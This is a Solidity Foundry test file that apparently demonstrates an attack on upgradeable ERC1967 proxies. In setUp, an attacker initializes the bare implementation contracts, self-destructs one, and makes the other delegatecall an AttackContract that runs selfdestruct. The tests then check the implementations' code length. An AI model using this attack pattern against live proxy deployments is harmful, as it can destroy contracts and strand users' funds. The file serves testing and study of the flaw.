// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {HelpUtils} from "./HelpUtils.sol";
import {Test, console} from "forge-std/Test.sol";
import {ImplementationSelf} from "../src/ImplementationSelf.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract AttackContract {
    function withdraw() public payable {
        selfdestruct(payable(address(123456)));
    }
}

contract ImplementationSelfTest is Test, HelpUtils {
    uint256 constant private_key = 666666;
    address account = vm.addr(private_key);
    ImplementationSelf implementationSelf;
    ImplementationSelf implementationSelf2;
    address public proxy;
    address public proxy2;
    address attacker = vm.addr(123456);

    function setUp() public {
        implementationSelf = new ImplementationSelf();

        proxy = address(
            new ERC1967Proxy(
                address(implementationSelf),
                abi.encodeCall(
                    ImplementationSelf.initialize,
                    (address(1), account)
                )
            )
        );
        implementationSelf2 = new ImplementationSelf();

        proxy2 = address(
            new ERC1967Proxy(
                address(implementationSelf2),
                abi.encodeCall(
                    ImplementationSelf.initialize,
                    (address(1), account)
                )
            )
        );

        // console.log("proxy.owner()", ImplementationSelf(proxy).owner());
        address implementation = HelpUtils.getImplementationAddress(proxy);
        console.log(
            "proxy.implementation code length:",
            implementation.code.length
        );
        address implementation2 = HelpUtils.getImplementationAddress(proxy2);
        console.log(
            "proxy2.implementation code length:",
            implementation2.code.length
        );

        // TODO:attacker destructs the contract
        vm.startPrank(attacker);
        implementationSelf.initialize(address(3), attacker);
        implementationSelf.selfDestruct();
        vm.stopPrank();

        // TODO:attacker delegatecall attack contract
        vm.startPrank(attacker);
        AttackContract attackContract = new AttackContract();
        implementationSelf2.initialize(address(attackContract), attacker);
        implementationSelf2.withdraw();
        vm.stopPrank();

        console.log("Attack After:");
    }

    function testProxyOwner_ImplContractDestroyed_ProxyCanNotCallImplContract()
        public
        view
    {
        address implementation = HelpUtils.getImplementationAddress(proxy);
        console.log(
            "proxy.implementation code length:",
            implementation.code.length
        );
    }

    function testProxyOwner_ImplContractDelegateOtherDestroyedContract_ProxyCanNotCall()
        public
        view
    {
        address implementation = HelpUtils.getImplementationAddress(proxy2);
        console.log(
            "proxy2.implementation code length:",
            implementation.code.length
        );
    }
}
